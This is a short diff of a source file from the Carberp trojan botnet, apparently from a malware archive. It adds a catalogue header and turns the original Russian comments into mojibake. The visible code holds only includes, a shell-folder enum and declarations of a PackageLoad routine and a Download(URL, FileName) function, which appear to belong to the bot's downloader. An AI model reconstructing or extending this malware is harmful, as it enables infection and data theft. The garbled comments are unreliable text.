@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include<windows.h>
 #include"GetApi.h"
 #include"BotHTTP.h"
@@ -5,7 +16,7 @@
 #include"Memory.h"
 
 
-///необходимые флаги
+///пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 typedef enum {
     SHGFP_TYPE_CURRENT  = 0,   // current value for user, verify it exists
     SHGFP_TYPE_DEFAULT  = 1,   // default value, may not exist
@@ -13,7 +24,7 @@ typedef enum {
 #define CSIDL_APPDATA                   0x001a        // <user name>\Application Data
 DWORD WINAPI PackageLoad( LPVOID lpData );
 void Download(char*URL,WCHAR*FileName);
-/*пример использования
+/*пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 /*#include"PackageLoad.h"
 int DownloadBigFile()
 {
